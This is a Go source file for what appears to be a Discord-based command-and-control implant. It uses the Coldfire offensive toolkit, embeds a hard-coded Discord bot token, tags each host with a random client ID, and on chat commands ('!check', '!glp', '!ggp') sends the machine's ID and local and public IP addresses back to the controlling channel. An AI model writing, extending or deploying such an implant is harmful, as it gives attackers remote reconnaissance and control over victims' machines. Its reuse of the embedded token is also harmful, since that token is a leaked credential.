package main

import (
	"os"
	"fmt"
	"syscall"
	"os/signal"
	"github.com/google/uuid"
	"github.com/bwmarrin/discordgo"
	"github.com/redcode-labs/Coldfire"
)

var CORDTKN string = "MTAyMDAzNjcyNjkzNDIyNDg5Ng.GNmtJ7.bW150vRIwr7LuDbxL_mz15eMmwLS5CsEtachV8"
var CID string

func GLP() string {
	ip := coldfire.GetLocalIp()
	return ip
}

func GGP() string {
	ip := coldfire.GetGlobalIp()
	return ip
}

func gID() string {
	id, err := uuid.NewRandom()
	if err != nil {
		fmt.Println("Could not generate unique ID using default")
		return "FUCK"
	}
	return id.String()
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == "!check" {
		s.ChannelMessageSend(m.ChannelID, "Hi! from " + CID)
	}

	if m.Content == "!glp" {
		ip := GLP()
		s.ChannelMessageSend(m.ChannelID, ip)
	}

	if m.Content == "!ggp" {
		ip := GGP()
		s.ChannelMessageSend(m.ChannelID, ip)
	}
}

func main() {
	CID = gID() // CLIENT ID
	cord, err := discordgo.New("Bot " + CORDTKN)
	if err != nil {
		fmt.Println("Error creating Discord session,", err)
		return
	}

	cord.AddHandler(messageCreate)

	cord.Identify.Intents = discordgo.IntentsGuildMessages

	err = cord.Open()
	if err != nil {
		fmt.Println("Error opening connection,", err)
		return
	}

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	cord.Close()
}